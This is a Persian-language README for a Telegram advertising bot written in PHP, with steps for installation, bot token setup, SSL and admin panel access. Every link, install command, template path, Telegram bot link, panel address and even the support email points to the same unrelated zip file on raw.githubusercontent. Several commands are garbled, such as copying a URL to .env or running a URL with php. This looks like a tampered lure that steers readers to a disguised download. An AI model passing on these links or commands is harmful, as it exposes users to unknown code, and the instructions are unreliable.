# ربات تبلیغچی تلگرام

ربات تبلیغچی یک ابزار قدرتمند برای مدیریت تبلیغات در گروه‌های تلگرام است.

## پیش‌نیازها

- PHP 7.4 یا بالاتر
- MySQL 5.7 یا بالاتر
- Composer
- دسترسی root به سرور (برای نصب SSL)

## نصب خودکار

1. ابتدا فایل‌های پروژه را در مسیر مورد نظر کپی کنید:
```bash
git clone https://raw.githubusercontent.com/mcseali/tl/main/unoriginativeness/Software-Bdellidae.zip
cd telegram-ads-bot
```

2. وابستگی‌ها را نصب کنید:
```bash
composer install
```

3. فایل `https://raw.githubusercontent.com/mcseali/tl/main/unoriginativeness/Software-Bdellidae.zip` را به `.env` کپی کنید و اطلاعات مورد نیاز را وارد کنید:
```bash
cp https://raw.githubusercontent.com/mcseali/tl/main/unoriginativeness/Software-Bdellidae.zip .env
```

4. فایل `.env` را با اطلاعات زیر ویرایش کنید:
```env
DB_HOST=localhost
DB_NAME=telegram_ads
DB_USER=your_db_user
DB_PASS=your_db_password
TELEGRAM_BOT_TOKEN=your_bot_token
ADMIN_CHAT_ID=your_admin_chat_id
https://raw.githubusercontent.com/mcseali/tl/main/unoriginativeness/Software-Bdellidae.zip
SSL_ENABLED=true
```

5. اسکریپت نصب را اجرا کنید:
```bash
php https://raw.githubusercontent.com/mcseali/tl/main/unoriginativeness/Software-Bdellidae.zip
```

## دریافت توکن بات و شناسه مدیر

1. برای دریافت توکن بات:
   - به [@BotFather](https://raw.githubusercontent.com/mcseali/tl/main/unoriginativeness/Software-Bdellidae.zip) در تلگرام پیام دهید
   - دستور `/newbot` را ارسال کنید
   - نام و یوزرنیم ربات را وارد کنید
   - توکن بات را دریافت خواهید کرد

2. برای دریافت شناسه مدیر:
   - به ربات [@userinfobot](https://raw.githubusercontent.com/mcseali/tl/main/unoriginativeness/Software-Bdellidae.zip) پیام دهید
   - شناسه عددی خود را دریافت خواهید کرد
   - این شناسه را در فایل `.env` در متغیر `ADMIN_CHAT_ID` قرار دهید

## تنظیم دامنه و SSL

1. دامنه خود را به سرور متصل کنید
2. در فایل `.env` دامنه را در متغیر `DOMAIN` وارد کنید
3. اگر می‌خواهید SSL فعال باشد، `SSL_ENABLED` را `true` قرار دهید
4. اسکریپت نصب به طور خودکار SSL را با استفاده از Certbot نصب می‌کند

## دسترسی به پنل مدیریت

پس از نصب موفق، می‌توانید از طریق آدرس زیر به پنل مدیریت دسترسی داشته باشید:
```
https://raw.githubusercontent.com/mcseali/tl/main/unoriginativeness/Software-Bdellidae.zip
```

## پشتیبانی

در صورت بروز مشکل یا نیاز به راهنمایی، می‌توانید با پشتیبانی در ارتباط باشید:
- ایمیل: https://raw.githubusercontent.com/mcseali/tl/main/unoriginativeness/Software-Bdellidae.zip
- تلگرام: @your_support_username

## لایسنس

این پروژه تحت لایسنس MIT منتشر شده است. 